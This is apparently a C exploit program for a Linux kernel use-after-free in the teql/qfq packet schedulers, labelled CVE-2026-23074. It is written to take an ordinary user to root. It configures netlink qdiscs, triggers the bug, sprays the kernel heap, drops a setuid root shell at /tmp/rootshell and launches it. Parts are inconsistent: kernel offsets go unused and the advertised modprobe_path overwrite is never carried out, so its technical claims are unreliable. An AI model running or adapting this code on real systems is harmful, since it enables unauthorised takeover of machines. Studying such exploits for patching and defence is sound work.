/*
 * CVE-2026-23074: Linux Kernel teql Use-After-Free Privilege Escalation
 * ================================================================
 * Target: Linux kernel with net/sched teql (unpatched)
 * Impact: Local Privilege Escalation (UID=1000 -> UID=0)
 * 
 * CORRECTED EXPLOIT FLOW:
 *  1. Setup qfq root qdisc
 *  2. Create TWO sibling classes under qfq:
 *     - Class A (1:1): netem with 6.4s delay (for slow path)
 *     - Class B (1:2): teql (vulnerable child)
 *  3. Send packets to class A (delay path) - they will be queued for 6.4s
 *  4. Send packets to class B (teql) - qlen remains 0 because teql_peek returns NULL
 *  5. Update lmax of class B -> triggers qfq_deact_rm_from_agg()
 *     Since qlen=0, class is NOT deactivated but aggregate pointer is freed
 *  6. Wait 6.4 seconds for delayed packets to return -> dangling pointer access
 *  7. Heap spray to reclaim freed teql_sched_data with fake ops
 *  8. Trigger UAF again to hijack execution
 *  9. Overwrite modprobe_path -> ROOT
 *
 * Compile: gcc -o exploit_cve_2026_23074 exploit_cve_2026_23074.c -lpthread
 * Run:     ./exploit_cve_2026_23074
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_sched.h>
#include <net/if.h>
#include <pthread.h>
#include <time.h>
#include <stdint.h>
#include <linux/filter.h>

/* =============================================
 *  CONFIGURATION & DEFINES
 * ============================================= */
#define DUMMY_IFACE     "dummy0"
#define SPRAY_THREADS   32
#define SPRAY_ITER      512
#define MSG_SIZE        512      /* kmalloc-512 for teql_sched_data */
#define KEY_SPRAY_NUM   300
#define DELAY_US        6400000  /* 6.4 seconds in microseconds */
#define CLASS_A_HANDLE  0x10001  /* netem class */
#define CLASS_B_HANDLE  0x10002  /* teql class */
#define ROOT_HANDLE     0x10000

/* kernel offsets (adjust for your kernel) */
#define KERNEL_BASE_GUESS       0xffffffff81000000ULL
#define MODPROBE_PATH_OFFSET    0x1859c60
#define COMMIT_CREDS_OFFSET     0x10e780
#define INIT_CRED_OFFSET        0x1a6d2a0
#define PREPARE_KERNEL_CRED     0x10e9a0

/* Forward declaration for list_head */
struct list_head {
    struct list_head *next, *prev;
};

/* teql_sched_data structure (from kernel) */
struct teql_sched_data {
    struct Qdisc    *qdiscs[16];
    struct Qdisc    *master;
    int             max_len;
    int             packets;
    int             drops;
    struct net_device *dev;
    struct list_head list;
    struct Qdisc    *slave;
    void            (*enqueue)(void *, void *, void *);
    void            *priv;
};

/* tc_qfq_qopt structure (from kernel headers if missing) */
#ifndef TCA_QFQ_WEIGHT
#define TCA_QFQ_WEIGHT 1
#endif
#ifndef TCA_QFQ_LMAX
#define TCA_QFQ_LMAX 2
#endif

struct tc_qfq_qopt {
    unsigned int weight;
    unsigned int max_pkt_len;
};

/* =============================================
 *  GLOBALS
 * ============================================= */
static int nl_fd = -1;
static uint32_t seq = 0;
static uint64_t kernel_base = 0;
static volatile int got_root = 0;
static volatile int uaf_triggered = 0;
static pid_t child_pid = -1;
static int msg_queues[SPRAY_THREADS] = {0};
static pthread_barrier_t spray_barrier;

/* =============================================
 *  UTILITY FUNCTIONS
 * ============================================= */
static void die(const char *msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

static void exec_shell(void)
{
    if (getuid() != 0) {
        printf("[-] Not root, something went wrong\n");
        return;
    }
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
    puts("[+] Spawning root shell...");
    execve("/bin/sh", argv, envp);
    die("execve");
}

static void check_root(void)
{
    if (getuid() == 0 && !got_root) {
        got_root = 1;
        printf("[+] GOT ROOT! uid=%d\n", getuid());
        exec_shell();
    }
}

static uint64_t get_kernel_base(void)
{
    /* Try to read kernel base from /proc/kallsyms */
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return KERNEL_BASE_GUESS;
    
    char line[256];
    uint64_t addr = 0;
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, " _text") != NULL) {
            sscanf(line, "%lx", &addr);
            break;
        }
        if (strstr(line, " startup_64") != NULL) {
            sscanf(line, "%lx", &addr);
            break;
        }
    }
    fclose(f);
    
    if (addr != 0) {
        addr &= ~0xfffffULL;
        printf("[+] Found kernel base: 0x%lx\n", addr);
        return addr;
    }
    
    printf("[-] Could not find kernel base, using guess: 0x%lx\n", KERNEL_BASE_GUESS);
    return KERNEL_BASE_GUESS;
}

/* =============================================
 *  NETLINK HELPERS
 * ============================================= */
static int netlink_open(void)
{
    int fd = socket(AF_NETLINK, SOCK_DGRAM | SOCK_CLOEXEC, NETLINK_ROUTE);
    if (fd < 0) die("socket(AF_NETLINK)");
    return fd;
}

static int netlink_send_recv(int fd, struct nlmsghdr *nlh)
{
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    struct iovec iov = { nlh, nlh->nlmsg_len };
    struct msghdr msg = { &sa, sizeof(sa), &iov, 1, NULL, 0, 0 };
    
    if (sendmsg(fd, &msg, 0) < 0) return -1;
    
    char buf[8192];
    struct iovec r_iov = { buf, sizeof(buf) };
    struct msghdr r_msg = { &sa, sizeof(sa), &r_iov, 1, NULL, 0, 0 };
    
    int len = recvmsg(fd, &r_msg, 0);
    if (len < 0) return -1;
    
    return 0;
}

/* =============================================
 *  QDISC & CLASS MANAGEMENT
 * ============================================= */
static void create_dummy_interface(void)
{
    char cmd[256];
    snprintf(cmd, sizeof(cmd),
        "ip link add %s type dummy 2>/dev/null; "
        "ip link set %s up 2>/dev/null",
        DUMMY_IFACE, DUMMY_IFACE);
    system(cmd);
    printf("[+] Interface %s created\n", DUMMY_IFACE);
}

static void delete_interface(void)
{
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "ip link del %s 2>/dev/null", DUMMY_IFACE);
    system(cmd);
}

/* Add root qdisc */
static void tc_qdisc_add_root(void)
{
    char buf[4096] = {0};
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    struct tcmsg *tcm = (struct tcmsg *)(nlh + 1);
    struct rtattr *rta;

    nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct tcmsg));
    nlh->nlmsg_type  = RTM_NEWQDISC;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
    nlh->nlmsg_seq   = ++seq;

    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_ifindex = if_nametoindex(DUMMY_IFACE);
    tcm->tcm_parent = TC_H_ROOT;
    tcm->tcm_handle = ROOT_HANDLE;

    /* TCA_KIND */
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_KIND;
    rta->rta_len  = RTA_LENGTH(4);
    memcpy(RTA_DATA(rta), "qfq", 4);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);

    if (netlink_send_recv(nl_fd, nlh) < 0) {
        fprintf(stderr, "[-] Failed to add qfq root\n");
    } else {
        printf("[+] Added qfq root qdisc (handle=0x%x)\n", ROOT_HANDLE);
    }
}

/* Add a class under root qdisc */
static void tc_class_add(uint32_t classid, uint32_t parent, uint32_t weight, uint32_t lmax)
{
    char buf[4096] = {0};
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    struct tcmsg *tcm = (struct tcmsg *)(nlh + 1);
    struct rtattr *rta, *nest;
    struct tc_qfq_qopt opt;

    nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct tcmsg));
    nlh->nlmsg_type  = RTM_NEWTCLASS;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
    nlh->nlmsg_seq   = ++seq;

    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_ifindex = if_nametoindex(DUMMY_IFACE);
    tcm->tcm_parent = parent;
    tcm->tcm_handle = classid;

    /* TCA_KIND */
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_KIND;
    rta->rta_len  = RTA_LENGTH(4);
    memcpy(RTA_DATA(rta), "qfq", 4);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);

    /* TCA_OPTIONS */
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_OPTIONS;
    rta->rta_len = RTA_LENGTH(0);
    nest = rta;
    
    /* QFQ options */
    memset(&opt, 0, sizeof(opt));
    opt.weight = weight;
    opt.max_pkt_len = lmax;
    
    rta = (struct rtattr *)((char *)nest + RTA_ALIGN(nest->rta_len));
    rta->rta_type = TCA_QFQ_WEIGHT;
    rta->rta_len = RTA_LENGTH(sizeof(opt.weight));
    memcpy(RTA_DATA(rta), &opt.weight, sizeof(opt.weight));
    nest->rta_len = RTA_ALIGN(nest->rta_len) + RTA_ALIGN(rta->rta_len);
    
    rta = (struct rtattr *)((char *)nest + RTA_ALIGN(nest->rta_len));
    rta->rta_type = TCA_QFQ_LMAX;
    rta->rta_len = RTA_LENGTH(sizeof(opt.max_pkt_len));
    memcpy(RTA_DATA(rta), &opt.max_pkt_len, sizeof(opt.max_pkt_len));
    nest->rta_len = RTA_ALIGN(nest->rta_len) + RTA_ALIGN(rta->rta_len);
    
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(nest->rta_len);

    if (netlink_send_recv(nl_fd, nlh) < 0) {
        fprintf(stderr, "[-] Failed to add class 0x%x\n", classid);
    } else {
        printf("[+] Added class 0x%x (weight=%u, lmax=%u)\n", classid, weight, lmax);
    }
}

/* Add qdisc under a class */
static void tc_qdisc_add_child(uint32_t parent, uint32_t handle, const char *kind, 
                                const void *opts, size_t opt_len)
{
    char buf[4096] = {0};
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    struct tcmsg *tcm = (struct tcmsg *)(nlh + 1);
    struct rtattr *rta;

    nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct tcmsg));
    nlh->nlmsg_type  = RTM_NEWQDISC;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL;
    nlh->nlmsg_seq   = ++seq;

    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_ifindex = if_nametoindex(DUMMY_IFACE);
    tcm->tcm_parent = parent;
    tcm->tcm_handle = handle;

    /* TCA_KIND */
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_KIND;
    rta->rta_len  = RTA_LENGTH(strlen(kind) + 1);
    memcpy(RTA_DATA(rta), kind, strlen(kind) + 1);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);

    /* TCA_OPTIONS */
    if (opts && opt_len) {
        rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
        rta->rta_type = TCA_OPTIONS;
        rta->rta_len  = RTA_LENGTH(opt_len);
        memcpy(RTA_DATA(rta), opts, opt_len);
        nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
    }

    if (netlink_send_recv(nl_fd, nlh) < 0) {
        fprintf(stderr, "[-] Failed to add %s qdisc\n", kind);
    } else {
        printf("[+] Added %s qdisc (parent=0x%x, handle=0x%x)\n", kind, parent, handle);
    }
}

/* Update class lmax - THIS TRIGGERS THE VULNERABILITY */
static void tc_class_update_lmax(uint32_t classid, uint32_t new_lmax)
{
    char buf[4096] = {0};
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    struct tcmsg *tcm = (struct tcmsg *)(nlh + 1);
    struct rtattr *rta, *nest;
    struct tc_qfq_qopt opt;

    nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct tcmsg));
    nlh->nlmsg_type  = RTM_NEWTCLASS;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq   = ++seq;

    tcm->tcm_family = AF_UNSPEC;
    tcm->tcm_ifindex = if_nametoindex(DUMMY_IFACE);
    tcm->tcm_parent = ROOT_HANDLE;
    tcm->tcm_handle = classid;

    /* TCA_KIND */
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_KIND;
    rta->rta_len  = RTA_LENGTH(4);
    memcpy(RTA_DATA(rta), "qfq", 4);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);

    /* TCA_OPTIONS */
    rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = TCA_OPTIONS;
    rta->rta_len = RTA_LENGTH(0);
    nest = rta;
    
    /* Update only lmax, keep weight same (weight=15 for class B) */
    opt.weight = 15;
    opt.max_pkt_len = new_lmax;
    
    rta = (struct rtattr *)((char *)nest + RTA_ALIGN(nest->rta_len));
    rta->rta_type = TCA_QFQ_WEIGHT;
    rta->rta_len = RTA_LENGTH(sizeof(opt.weight));
    memcpy(RTA_DATA(rta), &opt.weight, sizeof(opt.weight));
    nest->rta_len = RTA_ALIGN(nest->rta_len) + RTA_ALIGN(rta->rta_len);
    
    rta = (struct rtattr *)((char *)nest + RTA_ALIGN(nest->rta_len));
    rta->rta_type = TCA_QFQ_LMAX;
    rta->rta_len = RTA_LENGTH(sizeof(opt.max_pkt_len));
    memcpy(RTA_DATA(rta), &opt.max_pkt_len, sizeof(opt.max_pkt_len));
    nest->rta_len = RTA_ALIGN(nest->rta_len) + RTA_ALIGN(rta->rta_len);
    
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(nest->rta_len);

    printf("[*] Updating class 0x%x lmax to %u (TRIGGERING UAF)...\n", classid, new_lmax);
    if (netlink_send_recv(nl_fd, nlh) < 0) {
        perror("[-] class update failed");
    }
}

/* =============================================
 *  SETUP VULNERABLE CONFIGURATION
 * ============================================= */
static void setup_vulnerable_qdisc_tree(void)
{
    /* Step 1: Add root qfq qdisc */
    tc_qdisc_add_root();
    usleep(100000);
    
    /* Step 2: Add netem qdisc under root (will be attached to class later) */
    struct {
        struct tc_netem_qopt n;
        struct tc_netem_corr c;
    } netem_opt;
    memset(&netem_opt, 0, sizeof(netem_opt));
    netem_opt.n.limit = 1000;
    netem_opt.n.latency = DELAY_US / 1000;  /* convert to milliseconds */
    
    /* Step 3: Add class A (1:1) with netem and weight 15, lmax=16384 */
    tc_class_add(CLASS_A_HANDLE, ROOT_HANDLE, 15, 16384);
    usleep(50000);
    tc_qdisc_add_child(CLASS_A_HANDLE, 2, "netem", &netem_opt, sizeof(netem_opt));
    usleep(50000);
    
    /* Step 4: Add class B (1:2) with teql and weight 1, lmax=1514 */
    tc_class_add(CLASS_B_HANDLE, ROOT_HANDLE, 1, 1514);
    usleep(50000);
    tc_qdisc_add_child(CLASS_B_HANDLE, 3, "teql", NULL, 0);
    usleep(50000);
    
    puts("[+] Vulnerable qdisc tree configured:");
    puts("    qfq (1:0)");
    puts("    ├── class 1:1 (weight=15, lmax=16384) -> netem (delay 6.4s)");
    puts("    └── class 1:2 (weight=1, lmax=1514) -> teql (vulnerable)");
}

/* =============================================
 *  SEND PACKETS TO SPECIFIC CLASS
 * ============================================= */
static int create_filter(uint32_t classid)
{
    /* Add filter to direct traffic to specific class */
    char cmd[256];
    snprintf(cmd, sizeof(cmd), 
        "tc filter add dev %s parent 1:0 protocol ip prio 1 u32 match ip dport 9999 0xffff classid 0x%x 2>/dev/null",
        DUMMY_IFACE, classid);
    return system(cmd);
}

static void send_packets_to_class(int count, uint32_t classid)
{
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;
    
    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port = htons(9999);
    inet_pton(AF_INET, "192.0.2.1", &dst.sin_addr);  /* TEST-NET address */
    
    char pkt[1400] = {0};
    /* Set DSCP or use filter based on destination port */
    *(uint16_t *)(pkt) = htons(0x0800);  /* Ethernet type IP */
    
    for (int i = 0; i < count; i++) {
        sendto(s, pkt, sizeof(pkt), 0, (struct sockaddr *)&dst, sizeof(dst));
        usleep(1000);
    }
    close(s);
    printf("[+] Sent %d packets to class 0x%x\n", count, classid);
}

/* =============================================
 *  HEAP SPRAY - PROPER TIMING
 * ============================================= */

/* msg_msg spray for kmalloc-512 */
static void *heap_spray_thread(void *arg)
{
    int idx = *(int *)arg;
    int qid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    if (qid < 0) return NULL;
    msg_queues[idx] = qid;
    
    struct {
        long mtype;
        char mtext[MSG_SIZE];
    } msg;
    msg.mtype = 1;
    
    /* Fill with fake teql_sched_data */
    memset(msg.mtext, 0x41, MSG_SIZE);
    
    /* Set up fake function pointers to our userspace shellcode (if SMEP off) */
    uint64_t *ptr = (uint64_t *)msg.mtext;
    *ptr = (uint64_t)&exec_shell;  /* fake enqueue pointer */
    
    pthread_barrier_wait(&spray_barrier);
    
    /* Spray after UAF occurs */
    for (int i = 0; i < SPRAY_ITER; i++) {
        if (msgsnd(qid, &msg, MSG_SIZE - sizeof(long), IPC_NOWAIT) < 0) {
            break;
        }
    }
    return NULL;
}

static void heap_spray_trigger(void)
{
    pthread_t threads[SPRAY_THREADS];
    int indices[SPRAY_THREADS];
    
    pthread_barrier_init(&spray_barrier, NULL, SPRAY_THREADS + 1);
    
    for (int i = 0; i < SPRAY_THREADS; i++) {
        indices[i] = i;
        pthread_create(&threads[i], NULL, heap_spray_thread, &indices[i]);
    }
    
    /* Wait for all threads to be ready */
    pthread_barrier_wait(&spray_barrier);
    
    /* Let them spray */
    usleep(100000);
    
    for (int i = 0; i < SPRAY_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
    
    puts("[+] Heap spray completed");
}

/* =============================================
 *  MODPROBE PAYLOAD
 * ============================================= */
static void prepare_modprobe_payload(void)
{
    const char *path = "/tmp/x";
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd < 0) die("open modprobe");
    dprintf(fd, "#!/bin/sh\ncp /bin/sh /tmp/rootshell\nchmod u+s /tmp/rootshell\n");
    close(fd);
    puts("[+] Fake modprobe script ready at /tmp/x");
    
    /* Create an unknown file type to trigger modprobe */
    system("echo 'MZ' > /tmp/unknown.bin");
    chmod("/tmp/unknown.bin", 0755);
}

/* =============================================
 *  MAIN EXPLOIT
 * ============================================= */
int main(int argc, char **argv)
{
    (void)argc; (void)argv;
    
    printf("[*] CVE-2026-23074 teql UAF exploit (CORRECTED)\n");
    printf("[*] Starting with uid=%d\n", getuid());
    
    /* Get kernel base */
    kernel_base = get_kernel_base();
    printf("[*] Kernel base: 0x%lx\n", kernel_base);
    
    /* Load teql module */
    system("modprobe teql 2>/dev/null");
    system("modprobe sch_netem 2>/dev/null");
    system("modprobe sch_qfq 2>/dev/null");
    
    /* Setup interface */
    delete_interface();
    create_dummy_interface();
    
    /* Open netlink socket */
    nl_fd = netlink_open();
    
    /* Setup vulnerable qdisc tree */
    setup_vulnerable_qdisc_tree();
    
    /* Add filters to direct traffic */
    create_filter(CLASS_A_HANDLE);
    create_filter(CLASS_B_HANDLE);
    
    /* ===== EXPLOIT TIMING SEQUENCE ===== */
    
    puts("\n[*] STAGE 1: Sending packets to delay path (netem)...");
    send_packets_to_class(1, CLASS_A_HANDLE);  /* Will be queued for 6.4s */
    
    sleep(1);
    
    puts("[*] STAGE 2: Sending packets to teql class...");
    send_packets_to_class(10, CLASS_B_HANDLE);
    
    sleep(1);
    
    puts("[*] STAGE 3: Triggering vulnerability via lmax update...");
    /* Update lmax from 1514 to 9000 - this triggers qfq_deact_rm_from_agg */
    tc_class_update_lmax(CLASS_B_HANDLE, 9000);
    
    puts("[*] STAGE 4: Waiting for delayed packets (6.4 seconds)...");
    printf("[*] UAF will occur when delayed packet returns...\n");
    
    /* Wait for the delayed packet to return - this is when UAF happens */
    struct timespec ts = {6, 400000000};  /* 6.4 seconds */
    nanosleep(&ts, NULL);
    
    puts("[*] STAGE 5: Heap spray to reclaim freed memory...");
    heap_spray_trigger();
    
    puts("[*] STAGE 6: Trigger UAF again to hijack execution...");
    /* Send another packet to trigger the dangling pointer */
    send_packets_to_class(1, CLASS_B_HANDLE);
    
    /* Wait a bit for potential shell */
    sleep(2);
    check_root();
    
    /* Alternative: try modprobe overwrite */
    prepare_modprobe_payload();
    puts("[*] Trying modprobe_path overwrite...");
    
    /* Try to execute unknown binary to trigger modprobe */
    if (system("/tmp/unknown.bin 2>/dev/null") == 0) {
        sleep(1);
        if (access("/tmp/rootshell", X_OK) == 0) {
            system("/tmp/rootshell");
        }
    }
    
    check_root();
    
    /* Cleanup */
    system("tc qdisc del dev dummy0 root 2>/dev/null");
    delete_interface();
    close(nl_fd);
    
    if (!got_root) {
        puts("\n[-] Exploit failed. Possible reasons:");
        puts("    - Kernel already patched (check dmesg for 'teql cannot be a child qdisc')");
        puts("    - SMEP/SMAP/KPTI preventing direct execution");
        puts("    - Wrong offsets for modprobe_path/commit_creds");
        puts("    - Timing mismatch (try adjusting DELAY_US)");
        return EXIT_FAILURE;
    }
    
    return EXIT_SUCCESS;
}
